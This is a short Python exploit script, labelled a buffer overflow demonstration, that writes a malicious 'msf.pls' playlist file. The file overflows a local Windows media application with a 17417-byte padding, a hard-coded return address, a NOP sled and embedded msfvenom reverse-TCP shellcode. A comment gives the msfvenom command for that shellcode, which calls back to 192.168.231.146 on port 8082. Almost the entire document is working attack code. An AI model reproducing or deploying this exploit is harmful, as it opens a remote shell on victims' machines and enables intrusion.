#!usr/bin/env python
#Buffer Overflow Demonstration
#Type : Local Exploitation
#Find the return address using mona in Immunity Debugger.
ret = "\xcf\xda\x05\x10" 	#Return address is little endian format

# msfvenom -p windows/shell_reverse_tcp LHOST=192.168.231.146 LPORT=8082 -b "\x00\x09\x0a" -f c
shellcode = ("\xda\xd0\xd9\x74\x24\xf4\xbb\x0e\x4c\xe1\x2c\x58\x29\xc9\xb1"
"\x52\x83\xc0\x04\x31\x58\x13\x03\x56\x5f\x03\xd9\x9a\xb7\x41"
"\x22\x62\x48\x26\xaa\x87\x79\x66\xc8\xcc\x2a\x56\x9a\x80\xc6"
"\x1d\xce\x30\x5c\x53\xc7\x37\xd5\xde\x31\x76\xe6\x73\x01\x19"
"\x64\x8e\x56\xf9\x55\x41\xab\xf8\x92\xbc\x46\xa8\x4b\xca\xf5"
"\x5c\xff\x86\xc5\xd7\xb3\x07\x4e\x04\x03\x29\x7f\x9b\x1f\x70"
"\x5f\x1a\xf3\x08\xd6\x04\x10\x34\xa0\xbf\xe2\xc2\x33\x69\x3b"
"\x2a\x9f\x54\xf3\xd9\xe1\x91\x34\x02\x94\xeb\x46\xbf\xaf\x28"
"\x34\x1b\x25\xaa\x9e\xe8\x9d\x16\x1e\x3c\x7b\xdd\x2c\x89\x0f"
"\xb9\x30\x0c\xc3\xb2\x4d\x85\xe2\x14\xc4\xdd\xc0\xb0\x8c\x86"
"\x69\xe1\x68\x68\x95\xf1\xd2\xd5\x33\x7a\xfe\x02\x4e\x21\x97"
"\xe7\x63\xd9\x67\x60\xf3\xaa\x55\x2f\xaf\x24\xd6\xb8\x69\xb3"
"\x19\x93\xce\x2b\xe4\x1c\x2f\x62\x23\x48\x7f\x1c\x82\xf1\x14"
"\xdc\x2b\x24\xba\x8c\x83\x97\x7b\x7c\x64\x48\x14\x96\x6b\xb7"
"\x04\x99\xa1\xd0\xaf\x60\x22\x1f\x87\x8d\x20\xf7\xda\x51\x5a"
"\x9a\x52\xb7\x0e\x8a\x32\x60\xa7\x33\x1f\xfa\x56\xbb\xb5\x87"
"\x59\x37\x3a\x78\x17\xb0\x37\x6a\xc0\x30\x02\xd0\x47\x4e\xb8"
"\x7c\x0b\xdd\x27\x7c\x42\xfe\xff\x2b\x03\x30\xf6\xb9\xb9\x6b"
"\xa0\xdf\x43\xed\x8b\x5b\x98\xce\x12\x62\x6d\x6a\x31\x74\xab"
"\x73\x7d\x20\x63\x22\x2b\x9e\xc5\x9c\x9d\x48\x9c\x73\x74\x1c"
"\x59\xb8\x47\x5a\x66\x95\x31\x82\xd7\x40\x04\xbd\xd8\x04\x80"
"\xc6\x04\xb5\x6f\x1d\x8d\xc5\x25\x3f\xa4\x4d\xe0\xaa\xf4\x13"
"\x13\x01\x3a\x2a\x90\xa3\xc3\xc9\x88\xc6\xc6\x96\x0e\x3b\xbb"
"\x87\xfa\x3b\x68\xa7\x2e")

offset = "A" * 17417
buffer= "http://" + offset + ret + "\x90" * 16 + shellcode

file1= open("msf.pls",'wb')
file1.write(buffer)
print "Creating msf.pls file..."
file1.close()

